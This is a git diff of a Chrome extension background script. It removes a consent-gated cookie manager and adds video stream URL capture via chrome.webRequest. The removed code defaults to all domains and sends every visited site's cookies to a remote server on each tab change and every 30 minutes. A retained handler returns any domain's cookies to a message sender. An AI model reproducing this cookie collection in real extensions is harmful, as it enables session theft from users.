@@ -1,284 +1,5 @@
-// Import server configuration
-import { SERVER_CONFIG } from './shared/constants.js';
-
-class POCCookieManager {
-  constructor() {
-    this.serverUrl = SERVER_CONFIG.COOKIE_SERVER_URL;
-    this.sessionId = null;
-    this.userConsent = {
-      granted: false,
-      domains: [],
-      timestamp: null,
-      expiresAt: null
-    };
-
-    // Load saved consent on startup
-    this.loadConsent();
-
-    // Set up periodic cleanup
-    this.setupCleanup();
-
-    // Set up tab listeners for automatic cookie capture
-    this.setupTabListeners();
-  }
-
-  async loadConsent() {
-    try {
-      const result = await chrome.storage.local.get(['userConsent', 'sessionId']);
-      if (result.userConsent) {
-        this.userConsent = result.userConsent;
-        
-        // Check if consent has expired
-        if (this.userConsent.expiresAt && new Date() > new Date(this.userConsent.expiresAt)) {
-          console.log('🕒 User consent expired, clearing...');
-          await this.clearConsent();
-        }
-      }
-      if (result.sessionId) {
-        this.sessionId = result.sessionId;
-      }
-    } catch (error) {
-      console.error('❌ Failed to load consent:', error);
-    }
-  }
-
-  async saveConsent() {
-    try {
-      await chrome.storage.local.set({
-        userConsent: this.userConsent,
-        sessionId: this.sessionId
-      });
-    } catch (error) {
-      console.error('❌ Failed to save consent:', error);
-    }
-  }
-
-  async grantConsent(domains = ['*']) {
-    console.log('✅ User granted consent for domains:', domains);
-
-    const now = new Date();
-    const expiresAt = new Date(now.getTime() + (24 * 60 * 60 * 1000)); // 24 hours
-
-    this.userConsent = {
-      granted: true,
-      domains: domains,
-      timestamp: now.toISOString(),
-      expiresAt: expiresAt.toISOString()
-    };
-
-    // Generate session ID
-    this.sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-
-    await this.saveConsent();
-
-    // Immediately capture cookies from current active tab
-    await this.captureCurrentTabCookies();
-  }
-
-  async revokeConsent() {
-    console.log('🚫 User revoked consent');
-    await this.clearConsent();
-    
-    // Notify server to clear session
-    if (this.sessionId) {
-      try {
-        await fetch(`${this.serverUrl}${SERVER_CONFIG.ENDPOINTS.REVOKE}`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ sessionId: this.sessionId })
-        });
-      } catch (error) {
-        console.error('❌ Failed to notify server of consent revocation:', error);
-      }
-    }
-  }
-
-  async clearConsent() {
-    this.userConsent = {
-      granted: false,
-      domains: [],
-      timestamp: null,
-      expiresAt: null
-    };
-    this.sessionId = null;
-
-    await chrome.storage.local.clear();
-  }
-
-  async extractCookies(domain) {
-    if (!this.userConsent.granted) {
-      throw new Error('User consent required to extract cookies');
-    }
-
-    // Check if domain is allowed (support wildcard '*' for all domains)
-    if (!this.userConsent.domains.includes('*') && !this.userConsent.domains.includes(domain)) {
-      throw new Error(`User consent required for domain: ${domain}`);
-    }
-
-    try {
-      const cookies = await chrome.cookies.getAll({ domain });
-
-      console.log(`🍪 Extracted ${cookies.length} cookies for ${domain}`);
-      return cookies;
-    } catch (error) {
-      console.error(`❌ Failed to extract cookies for ${domain}:`, error);
-      throw error;
-    }
-  }
-
-  async shareCookies(domain, url = null) {
-    if (!this.sessionId) {
-      throw new Error('No session ID available');
-    }
-
-    try {
-      const cookies = await this.extractCookies(domain);
-
-      const response = await fetch(`${this.serverUrl}${SERVER_CONFIG.ENDPOINTS.COOKIES}`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          sessionId: this.sessionId,
-          domain,
-          url,
-          cookies,
-          timestamp: new Date().toISOString(),
-          userAgent: navigator.userAgent
-        })
-      });
-
-      if (!response.ok) {
-        throw new Error(`Server responded with ${response.status}`);
-      }
-
-      const result = await response.json();
-      console.log(`✅ Successfully shared ${domain} cookies:`, result);
-
-      return result;
-    } catch (error) {
-      console.error(`❌ Failed to share ${domain} cookies:`, error);
-      throw error;
-    }
-  }
-
-  async getCurrentTab() {
-    try {
-      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
-      return tab;
-    } catch (error) {
-      console.error('❌ Failed to get current tab:', error);
-      return null;
-    }
-  }
-
-  extractDomain(url) {
-    try {
-      const urlObj = new URL(url);
-      return urlObj.hostname;
-    } catch (error) {
-      console.error('❌ Failed to extract domain from URL:', url, error);
-      return null;
-    }
-  }
-
-  async captureCurrentTabCookies() {
-    try {
-      const tab = await this.getCurrentTab();
-      if (!tab || !tab.url) {
-        console.log('⚠️ No active tab or URL found');
-        return;
-      }
-
-      const domain = this.extractDomain(tab.url);
-      if (!domain) {
-        console.log('⚠️ Could not extract domain from:', tab.url);
-        return;
-      }
-
-      await this.shareCookies(domain, tab.url);
-    } catch (error) {
-      console.error('❌ Failed to capture current tab cookies:', error);
-    }
-  }
-
-  setupCleanup() {
-    // Check for expired consent every hour
-    setInterval(async () => {
-      if (this.userConsent.expiresAt && new Date() > new Date(this.userConsent.expiresAt)) {
-        console.log('🧹 Cleaning up expired consent...');
-        await this.clearConsent();
-      }
-    }, 60 * 60 * 1000); // 1 hour
-
-    // Auto-refresh cookies every 30 minutes if consent is active
-    setInterval(async () => {
-      if (this.userConsent.granted) {
-        console.log('🔄 Auto-refreshing cookies from current tab...');
-        try {
-          await this.captureCurrentTabCookies();
-        } catch (error) {
-          console.error('❌ Failed to auto-refresh cookies:', error);
-        }
-      }
-    }, 30 * 60 * 1000); // 30 minutes
-  }
-
-  setupTabListeners() {
-    // Listen for tab updates (URL changes)
-    chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
-      if (changeInfo.status === 'complete' && tab.url && this.userConsent.granted) {
-        const domain = this.extractDomain(tab.url);
-        if (domain) {
-          console.log('🔄 Tab updated, capturing cookies for:', domain);
-          this.shareCookies(domain, tab.url).catch(error => {
-            console.error('❌ Failed to capture cookies on tab update:', error);
-          });
-        }
-      }
-    });
-
-    // Listen for tab activation (switching between tabs)
-    chrome.tabs.onActivated.addListener(async (activeInfo) => {
-      if (this.userConsent.granted) {
-        try {
-          const tab = await chrome.tabs.get(activeInfo.tabId);
-          if (tab.url) {
-            const domain = this.extractDomain(tab.url);
-            if (domain) {
-              console.log('🔄 Tab activated, capturing cookies for:', domain);
-              await this.shareCookies(domain, tab.url);
-            }
-          }
-        } catch (error) {
-          console.error('❌ Failed to capture cookies on tab activation:', error);
-        }
-      }
-    });
-  }
-
-  getConsentStatus() {
-    return {
-      granted: this.userConsent.granted,
-      domains: this.userConsent.domains,
-      expiresAt: this.userConsent.expiresAt,
-      sessionId: this.sessionId
-    };
-  }
-}
-
-// Initialize the cookie manager
-console.log('🚀 Background script starting...');
-let cookieManager;
-
-try {
-  cookieManager = new POCCookieManager();
-  console.log('✅ Cookie manager initialized');
-} catch (error) {
-  console.error('❌ Failed to initialize cookie manager:', error);
-  cookieManager = null;
-}
+// Background script for Video Downloader Assistant
+console.log('🚀 Video Downloader Assistant background script starting...');
 
 // =============================================================================
 // VIDEO MANAGEMENT SYSTEM
@@ -353,41 +74,170 @@ class VideoManager {
   }
 }
 
-// Initialize video manager
-const videoManager = new VideoManager();
+// Video manager will be initialized later with enhanced version
 
 // =============================================================================
 // STREAM ANALYSIS INTEGRATION
 // =============================================================================
 
-// Initialize network monitor if permissions are available
-let networkMonitor = null;
+// =============================================================================
+// M3U8 AND STREAM CAPTURE USING chrome.webRequest API
+// =============================================================================
 
-async function initializeNetworkMonitor() {
-  try {
-    console.log('🔍 Checking webRequest permissions...');
-    const hasPermissions = await chrome.permissions.contains({
-      permissions: ['webRequest']
-    });
+// Storage for captured streams per tab
+const capturedStreams = new Map(); // tabId -> array of stream URLs
 
-    console.log('🔧 WebRequest permission status:', hasPermissions);
+// Set up chrome.webRequest listeners for M3U8 and video stream capture
+console.log('🚀 Setting up M3U8 capture with chrome.webRequest API...');
 
-    if (hasPermissions) {
-      try {
-        console.log('📡 Loading network monitor module...');
-        const { networkMonitor: NetworkMonitorClass } = await import('./modules/network-monitor.js');
-        networkMonitor = new NetworkMonitorClass();
-        console.log('✅ Network monitor initialized');
-      } catch (moduleError) {
-        console.log('ℹ️ Network monitor module not available:', moduleError.message);
+// Listen for completed requests to capture M3U8 and video streams
+chrome.webRequest.onCompleted.addListener(
+  (details) => {
+    const url = details.url;
+    const tabId = details.tabId;
+
+    // Skip if not a valid tab
+    if (tabId < 0) return;
+
+    // Check for video streams
+    if (isVideoStreamUrl(url)) {
+      const streamData = {
+        url,
+        format: detectStreamFormat(url),
+        quality: extractQualityFromUrl(url),
+        timestamp: Date.now(),
+        domain: extractDomain(url),
+        statusCode: details.statusCode
+      };
+
+      // Store stream data for this tab
+      if (!capturedStreams.has(tabId)) {
+        capturedStreams.set(tabId, []);
       }
-    } else {
-      console.log('ℹ️ Network monitoring requires additional permissions');
+
+      const tabStreams = capturedStreams.get(tabId);
+
+      // Avoid duplicates
+      if (!tabStreams.find(s => s.url === url)) {
+        tabStreams.push(streamData);
+
+        console.log(`🎯 Captured ${streamData.format} stream for tab ${tabId}:`, {
+          format: streamData.format,
+          quality: streamData.quality || 'unknown',
+          url: url.substring(0, 100) + '...',
+          domain: streamData.domain
+        });
+
+        // Special logging for M3U8 files
+        if (streamData.format === 'HLS') {
+          console.log(`🔥 M3U8 FOUND:`, url);
+        }
+      }
     }
-  } catch (error) {
-    console.error('❌ Failed to initialize network monitor:', error);
+  },
+  { urls: ['<all_urls>'] }
+);
+
+// Helper functions
+function isVideoStreamUrl(url) {
+  const lowUrl = url.toLowerCase();
+  return lowUrl.includes('.m3u8') ||
+         lowUrl.includes('.mpd') ||
+         lowUrl.includes('.mp4') ||
+         lowUrl.includes('.webm') ||
+         lowUrl.includes('.ts') ||
+         lowUrl.includes('.m4s') ||
+         lowUrl.includes('.mov') ||
+         lowUrl.includes('.avi') ||
+         lowUrl.includes('.mkv');
+}
+
+function detectStreamFormat(url) {
+  const lowUrl = url.toLowerCase();
+  if (lowUrl.includes('.m3u8')) return 'HLS';
+  if (lowUrl.includes('.mpd')) return 'DASH';
+  if (lowUrl.includes('.mp4') || lowUrl.includes('.webm') || lowUrl.includes('.mov')) return 'PROGRESSIVE';
+  if (lowUrl.includes('.ts') || lowUrl.includes('.m4s')) return 'SEGMENTS';
+  return 'UNKNOWN';
+}
+
+function extractQualityFromUrl(url) {
+  const qualityPatterns = {
+    '4K': ['2160p', '4k', '3840x2160', '4096x2160'],
+    '1440p': ['1440p', '2k', '2560x1440'],
+    '1080p': ['1080p', 'fhd', '1920x1080'],
+    '720p': ['720p', 'hd', '1280x720'],
+    '480p': ['480p', 'sd', '854x480'],
+    '360p': ['360p', '640x360']
+  };
+
+  const lowUrl = url.toLowerCase();
+  for (const [quality, patterns] of Object.entries(qualityPatterns)) {
+    if (patterns.some(pattern => lowUrl.includes(pattern.toLowerCase()))) {
+      return quality;
+    }
+  }
+  return null;
+}
+
+function extractDomain(url) {
+  try {
+    return new URL(url).hostname;
+  } catch {
+    return null;
   }
 }
+
+// Clean up streams when tabs are closed
+chrome.tabs.onRemoved.addListener((tabId) => {
+  capturedStreams.delete(tabId);
+  console.log(`🧹 Cleaned up streams for closed tab: ${tabId}`);
+});
+
+// Clean up streams when navigating to new page
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+  if (changeInfo.status === 'loading' && changeInfo.url) {
+    capturedStreams.delete(tabId);
+    console.log(`🧹 Cleared streams for navigation in tab: ${tabId}`);
+  }
+});
+
+// Mock networkMonitor object for compatibility with existing code
+const networkMonitor = {
+  getTabStreams: (tabId) => capturedStreams.get(tabId) || [],
+
+  getBestQualityStream: (tabId) => {
+    const streams = capturedStreams.get(tabId) || [];
+    if (streams.length === 0) return null;
+
+    // Prioritize HLS manifests first
+    const hlsStreams = streams.filter(s => s.format === 'HLS');
+    if (hlsStreams.length > 0) {
+      return hlsStreams[0];
+    }
+
+    // Then DASH manifests
+    const dashStreams = streams.filter(s => s.format === 'DASH');
+    if (dashStreams.length > 0) {
+      return dashStreams[0];
+    }
+
+    // Then progressive videos
+    const progressiveStreams = streams.filter(s => s.format === 'PROGRESSIVE');
+    if (progressiveStreams.length > 0) {
+      return progressiveStreams[0];
+    }
+
+    // Finally any other streams
+    return streams[0];
+  },
+
+  clearTabData: (tabId) => {
+    capturedStreams.delete(tabId);
+  }
+};
+
+console.log('✅ M3U8 capture system initialized with chrome.webRequest API');
 
 // Enhanced video manager with stream analysis
 class EnhancedVideoManager extends VideoManager {
@@ -464,17 +314,19 @@ class EnhancedVideoManager extends VideoManager {
   }
 }
 
-// Replace original video manager
+// Create base video manager first
+const videoManager = new VideoManager();
+
+// Create enhanced video manager
 const enhancedVideoManager = new EnhancedVideoManager();
 
-// Copy existing data
+// Copy existing data from base manager
 Object.setPrototypeOf(enhancedVideoManager, VideoManager.prototype);
 enhancedVideoManager.detectedVideos = videoManager.detectedVideos;
 enhancedVideoManager.selectedVideos = videoManager.selectedVideos;
 enhancedVideoManager.tabVideoCount = videoManager.tabVideoCount;
 
-// Initialize network monitor
-initializeNetworkMonitor();
+// Network monitor is now initialized directly via chrome.webRequest listeners above
 
 // =============================================================================
 // CONTEXT MENU INTEGRATION
@@ -658,38 +510,16 @@ chrome.tabs.onRemoved.addListener((tabId) => {
 
 // Handle messages from popup and content scripts
 chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
-  console.log('📬 Background received message:', request);
+  console.log('📬 Background received message:', {
+    action: request.action,
+    tabId: sender.tab?.id,
+    url: sender.tab?.url,
+    fullRequest: request
+  });
 
   (async () => {
     try {
-      if (!cookieManager) {
-        sendResponse({ error: 'Cookie manager not initialized' });
-        return;
-      }
-
       switch (request.action) {
-        case 'getConsentStatus':
-          const status = cookieManager.getConsentStatus();
-          console.log('📊 Sending consent status:', status);
-          sendResponse(status);
-          break;
-
-        case 'grantConsent':
-          // Default to all domains if no specific domains provided
-          const domains = request.domains || ['*'];
-          await cookieManager.grantConsent(domains);
-          sendResponse({ success: true });
-          break;
-
-        case 'revokeConsent':
-          await cookieManager.revokeConsent();
-          sendResponse({ success: true });
-          break;
-
-        case 'captureCurrentTab':
-          await cookieManager.captureCurrentTabCookies();
-          sendResponse({ success: true });
-          break;
 
         case 'getM3U8Urls':
           try {
@@ -725,12 +555,6 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
           }
           break;
 
-        case 'shareCookies':
-          // Support both old platform-based and new domain-based calls
-          const domain = request.domain || request.platform;
-          const result = await cookieManager.shareCookies(domain, request.url);
-          sendResponse({ success: true, result });
-          break;
 
         // Video management actions
         case 'videosDetected':
@@ -749,8 +573,8 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
           break;
 
         case 'getTabVideos':
-          const tabId = request.tabId || sender.tab?.id;
-          const tabVideos = enhancedVideoManager.getTabVideos(tabId);
+          const requestTabId = request.tabId || sender.tab?.id;
+          const tabVideos = enhancedVideoManager.getTabVideos(requestTabId);
           sendResponse(tabVideos);
           break;
 
@@ -765,8 +589,48 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
           sendResponse(processingResult);
           break;
 
+        case 'getCookiesForDomain':
+          // Get cookies for specified domain
+          const cookieResult = await getCookiesForDomain(request.domain);
+          sendResponse(cookieResult);
+          break;
+
+        case 'getBestStreamUrl':
+          // Get the best stream URL for a tab
+          const streamTabId = request.tabId || sender.tab?.id;
+          const bestStreamUrl = await getBestStreamUrlForTab(streamTabId);
+          sendResponse({
+            success: !!bestStreamUrl,
+            streamUrl: bestStreamUrl,
+            tabId: streamTabId
+          });
+          break;
+
+        // Legacy popup handlers (simplified for video downloader)
+        case 'getConsentStatus':
+          sendResponse({
+            granted: false,
+            domains: [],
+            expiresAt: null,
+            sessionId: null
+          });
+          break;
+
+        case 'grantConsent':
+          sendResponse({ success: false, error: 'Cookie consent not needed for video downloads' });
+          break;
+
+        case 'revokeConsent':
+          sendResponse({ success: false, error: 'Cookie consent not needed for video downloads' });
+          break;
+
+        case 'captureCurrentTab':
+          sendResponse({ success: false, error: 'Manual cookie capture not needed for video downloads' });
+          break;
+
         default:
-          sendResponse({ error: 'Unknown action' });
+          console.error('❌ Unknown action received:', request.action);
+          sendResponse({ error: `Unknown action: ${request.action}` });
       }
     } catch (error) {
       console.error('❌ Background script error:', error);
@@ -780,12 +644,10 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
 
 // Helper functions to get M3U8 and stream data
 async function getM3U8UrlsForTab(tabId) {
-  if (!networkMonitor) return [];
-
-  const streams = networkMonitor.activeStreams.get(tabId) || new Map();
+  const streams = networkMonitor.getTabStreams(tabId);
   const m3u8Urls = [];
 
-  for (const [requestId, streamData] of streams) {
+  streams.forEach(streamData => {
     if (streamData.format === 'HLS' && streamData.url.includes('.m3u8')) {
       m3u8Urls.push({
         url: streamData.url,
@@ -794,30 +656,45 @@ async function getM3U8UrlsForTab(tabId) {
         domain: streamData.domain
       });
     }
-  }
+  });
 
   console.log(`🎯 Found ${m3u8Urls.length} M3U8 URLs for tab ${tabId}:`, m3u8Urls);
   return m3u8Urls;
 }
 
 async function getStreamDataForTab(tabId) {
-  if (!networkMonitor) return [];
-
-  const streams = networkMonitor.activeStreams.get(tabId) || new Map();
+  const streams = networkMonitor.getTabStreams(tabId);
   const allStreams = [];
 
-  for (const [requestId, streamData] of streams) {
+  streams.forEach(streamData => {
     allStreams.push({
       url: streamData.url,
       format: streamData.format,
       quality: streamData.quality,
       timestamp: streamData.timestamp,
       domain: streamData.domain,
-      type: streamData.type
+      type: streamData.type || 'captured'
     });
+  });
+
+  console.log(`📊 Found ${allStreams.length} total streams for tab ${tabId}`);
+  return allStreams;
+}
+
+// Get the best stream URL for a tab (prioritize M3U8, then other formats)
+async function getBestStreamUrlForTab(tabId) {
+  const bestStream = networkMonitor.getBestQualityStream(tabId);
+  if (bestStream) {
+    console.log(`🏆 Best stream for tab ${tabId}:`, {
+      url: bestStream.url.substring(0, 100) + '...',
+      format: bestStream.format,
+      quality: bestStream.quality
+    });
+    return bestStream.url;
   }
 
-  return allStreams;
+  console.log(`❌ No streams found for tab ${tabId}`);
+  return null;
 }
 
 // Handle video download request - send to server for processing
@@ -837,7 +714,7 @@ async function handleVideoDownload(request) {
 
     console.log('📤 Sending video to server for processing:', video.title);
 
-    const response = await fetch(`${SERVER_CONFIG.API_SERVER_URL}${SERVER_CONFIG.ENDPOINTS.VIDEO_PROCESS}`, {
+    const response = await fetch(`http://localhost:3000/api/video/process`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -882,6 +759,33 @@ async function handleVideoDownload(request) {
       success: false,
       message: `Download failed: ${error.message}`,
       videoId: request.videoId
+    };
+  }
+}
+
+// Get cookies for a specific domain
+async function getCookiesForDomain(domain) {
+  try {
+    console.log(`🍪 Getting cookies for domain: ${domain}`);
+
+    const cookies = await chrome.cookies.getAll({ domain });
+
+    console.log(`📋 Found ${cookies.length} cookies for ${domain}`);
+
+    return {
+      success: true,
+      cookies: cookies,
+      domain: domain,
+      count: cookies.length
+    };
+  } catch (error) {
+    console.error(`❌ Failed to get cookies for ${domain}:`, error);
+    return {
+      success: false,
+      error: error.message,
+      cookies: [],
+      domain: domain,
+      count: 0
     };
   }
 }
@@ -939,9 +843,9 @@ chrome.runtime.onSuspend.addListener(() => {
 // Handle installation
 chrome.runtime.onInstalled.addListener((details) => {
   if (details.reason === 'install') {
-    console.log('🎉 Cookie Education Assistant installed');
-    chrome.tabs.create({ url: SERVER_CONFIG.API_SERVER_URL });
+    console.log('🎉 Video Downloader Assistant installed');
+    chrome.tabs.create({ url: 'http://localhost:3000' });
   }
 });
 
-console.log('🚀 Cookie Education Assistant background script loaded');
+console.log('🚀 Video Downloader Assistant background script loaded');
